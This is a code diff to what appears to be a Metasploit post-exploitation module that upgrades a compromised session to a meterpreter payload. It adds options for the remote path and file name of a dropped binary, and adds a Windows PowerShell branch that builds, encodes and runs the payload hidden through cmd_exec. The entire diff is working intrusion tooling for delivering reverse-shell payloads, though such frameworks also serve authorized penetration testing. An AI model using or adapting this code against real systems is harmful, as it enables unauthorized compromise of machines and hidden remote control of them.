@@ -41,7 +41,11 @@ class Metasploit3 < Msf::Post
       OptEnum.new('WIN_TRANSFER',
         [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
       OptString.new('PAYLOAD_OVERRIDE',
-        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil])
+        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
+      OptString.new('BOURNE_PATH',
+        [false, 'Remote path to drop binary']),
+      OptString.new('BOURNE_FILE',
+        [false, 'Remote filename to use for dropped binary'])
     ], self.class)
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -128,15 +132,37 @@ class Metasploit3 < Msf::Post
 
     case platform
     when 'win'
-      if (have_powershell?) && (datastore['WIN_TRANSFER'] != 'VBS')
-        vprint_status("Transfer method: Powershell")
-        psh_opts = { :prepend_sleep => 1, :encode_inner_payload => true, :persist => false }
-        cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
-      else
-        print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
-        vprint_status("Transfer method: VBS [fallback]")
-        exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
-        aborted = transmit_payload(exe)
+      if session.type == 'powershell'
+        template_path = File.join(Msf::Config.data_directory, 'templates', 'scripts')
+        psh_payload = case datastore['Powershell::method']
+                      when 'net'
+                        Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload_data)
+                      when 'reflection'
+                        Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, payload_data)
+                      when 'old'
+                        Rex::Powershell::Payload.to_win32pe_psh(template_path, payload_data)
+                      when 'msil'
+                        fail RuntimeError, 'MSIL Powershell method no longer exists'
+                      else
+                        fail RuntimeError, 'No Powershell method specified'
+                      end
+
+        # prepend_sleep => 1
+        psh_payload = 'Start-Sleep -s 1;' << psh_payload
+
+        encoded_psh_payload = encode_script(psh_payload)
+        cmd_exec(run_hidden_psh(encoded_psh_payload, psh_arch, true))
+      else # shell
+        if (have_powershell?) && (datastore['WIN_TRANSFER'] != 'VBS')
+          vprint_status("Transfer method: Powershell")
+          psh_opts = { :prepend_sleep => 1, :encode_inner_payload => true, :persist => false }
+          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
+        else
+          print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
+          vprint_status("Transfer method: VBS [fallback]")
+          exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
+          aborted = transmit_payload(exe)
+        end
       end
     when 'python'
       vprint_status("Transfer method: Python")
@@ -171,6 +197,8 @@ class Metasploit3 < Msf::Post
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
       opts[:background] = true
+      opts[:temp] = datastore['BOURNE_PATH']
+      opts[:file] = datastore['BOURNE_FILE']
       cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
       # Note: if a OS X binary payload is added in the future, use CmdStagerPrintf
       #       as /bin/sh on OS X doesn't support the -n option on echo
